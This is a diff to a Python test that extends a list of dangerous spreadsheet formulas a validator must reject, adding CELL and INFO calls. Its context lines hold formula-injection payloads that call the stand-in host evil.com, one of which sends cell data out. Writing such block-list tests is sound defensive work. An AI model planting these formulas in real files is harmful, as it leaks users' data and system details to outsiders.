@@ -87,6 +87,10 @@ class TestValidateCustomFormula:
             '=indirect("[http://evil.com/x.xlsx]Sheet1!A1")',
             '=ENCODEURL("http://evil.com/?d="&A1)',
             '=encodeurl("http://evil.com")',
+            '=CELL("filename")',
+            '=cell("filename",A1)',
+            '=INFO("system")',
+            '=info("osversion")',
         ],
         ids=[
             "WEBSERVICE_upper",
@@ -108,6 +112,10 @@ class TestValidateCustomFormula:
             "indirect_lower",
             "ENCODEURL_upper",
             "encodeurl_lower",
+            "CELL_upper",
+            "cell_lower",
+            "INFO_upper",
+            "info_lower",
         ],
     )
     def test_rejects_dangerous_functions(self, formula: str) -> None:
